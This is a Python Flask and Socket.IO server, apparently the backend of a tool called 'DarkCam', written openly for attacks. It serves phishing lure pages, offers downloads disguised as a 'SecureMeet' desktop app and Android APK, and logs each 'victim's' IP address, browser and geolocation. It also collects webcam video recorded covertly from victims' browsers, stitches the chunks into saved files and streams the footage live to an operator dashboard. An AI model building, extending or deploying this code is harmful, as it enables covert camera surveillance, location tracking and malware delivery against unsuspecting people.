import os
import json
import datetime
from gevent import monkey
monkey.patch_all()

from flask import Flask, request, jsonify, render_template
from flask_socketio import SocketIO, emit, join_room

app = Flask(__name__)
app.config["SECRET_KEY"] = "darkcam-secret"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="gevent",
                    logger=False, engineio_logger=False)

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ── HTTP routes ────────────────────────────────────────────────
@app.route("/")
def index():
    page = app.config.get("LURE_PAGE", "meet")
    return render_template(f"{page}.html")

@app.route("/live")
def live_dashboard():
    return render_template("live.html")

@app.route("/download")
def download_app():
    app_path = app.config.get("ELECTRON_APP_PATH", "")
    if app_path and os.path.exists(app_path):
        from flask import send_file
        return send_file(app_path, as_attachment=True,
                         download_name="SecureMeet.AppImage",
                         mimetype="application/octet-stream")
    return "Not available", 404

@app.route("/download/android")
def download_android():
    apk_path = app.config.get("ANDROID_APK_PATH", "")
    if apk_path and os.path.exists(apk_path):
        from flask import send_file
        return send_file(apk_path, as_attachment=True,
                         download_name="SecureMeet.apk",
                         mimetype="application/vnd.android.package-archive")
    return "Not available", 404

@app.route("/browser")
def open_in_browser():
    lure = app.config.get("BROWSER_LURE_PAGE", "captcha")
    return render_template(f"{lure}.html")

@app.route("/log", methods=["POST"])
def log_info():
    data = request.get_json(silent=True) or {}
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    ua = request.headers.get("User-Agent", "unknown")
    entry = {
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "ip": ip, "user_agent": ua, **data
    }
    log_path = os.path.join(OUTPUT_DIR, "victims.log")
    with open(log_path, "a") as f:
        f.write(json.dumps(entry) + "\n")
    g = data.get("geo", {})
    print(f"\n  \033[38;5;196m[+]\033[0m Victim: {ip} | {g.get('city','?')}, {g.get('country','?')} | {g.get('org','?')}")
    return jsonify({"status": "ok"})

@app.route("/upload", methods=["POST"])
def upload_chunk():
    sid   = request.args.get("sid", "unknown")
    chunk = request.args.get("chunk", "0")
    video_dir = os.path.join(OUTPUT_DIR, sid)
    os.makedirs(video_dir, exist_ok=True)
    data = request.get_data()
    if not data:
        return jsonify({"status": "empty"}), 400
    chunk_path = os.path.join(video_dir, f"chunk_{chunk.zfill(5)}.webm")
    with open(chunk_path, "wb") as f:
        f.write(data)
    print(f"  \033[38;5;208m[*]\033[0m Chunk {chunk} saved ({len(data)} bytes) — {sid}")
    return jsonify({"status": "ok"})

@app.route("/finalize", methods=["POST"])
def finalize():
    sid = request.args.get("sid", "unknown")
    video_dir = os.path.join(OUTPUT_DIR, sid)
    if not os.path.exists(video_dir):
        return jsonify({"status": "no chunks"}), 404
    chunks = sorted(f for f in os.listdir(video_dir) if f.startswith("chunk_"))
    if not chunks:
        return jsonify({"status": "no chunks"}), 404
    final_path = os.path.join(OUTPUT_DIR, f"{sid}.webm")
    with open(final_path, "wb") as out:
        for c in chunks:
            with open(os.path.join(video_dir, c), "rb") as f:
                out.write(f.read())
    for c in chunks:
        os.remove(os.path.join(video_dir, c))
    os.rmdir(video_dir)
    size_kb = os.path.getsize(final_path) // 1024
    print(f"\n  \033[38;5;196m[+]\033[0m Video saved: output/{sid}.webm ({size_kb} KB)\n")
    socketio.emit("victim_done", {"sid": sid, "size_kb": size_kb}, room="dashboard")
    return jsonify({"status": "saved", "file": f"{sid}.webm"})

# ── Socket.IO events ───────────────────────────────────────────
@socketio.on("join_dashboard")
def on_join_dashboard():
    join_room("dashboard")
    emit("dashboard_ready", {"msg": "Connected to DarkCam live feed"})

@socketio.on("victim_join")
def on_victim_join(data):
    """Victim browser connected and started camera."""
    sid  = data.get("sid", "?")
    lure = data.get("lure", "?")
    ip   = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    geo  = data.get("geo", {})
    info = {
        "sid":     sid,
        "lure":    lure,
        "ip":      ip,
        "city":    geo.get("city", "?"),
        "country": geo.get("country", "?"),
        "isp":     geo.get("org", "?"),
        "ua":      data.get("ua", "?"),
        "time":    datetime.datetime.utcnow().strftime("%H:%M:%S"),
    }
    print(f"\n  \033[38;5;196m[LIVE]\033[0m [{lure.upper()}] {ip} — {geo.get('city','?')}, {geo.get('country','?')}")
    socketio.emit("victim_connected", info, room="dashboard")

@socketio.on("live_chunk")
def on_live_chunk(data):
    """Relay video chunk from victim to dashboard watchers."""
    socketio.emit("stream_chunk", data, room="dashboard")

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=8080, allow_unsafe_werkzeug=True)
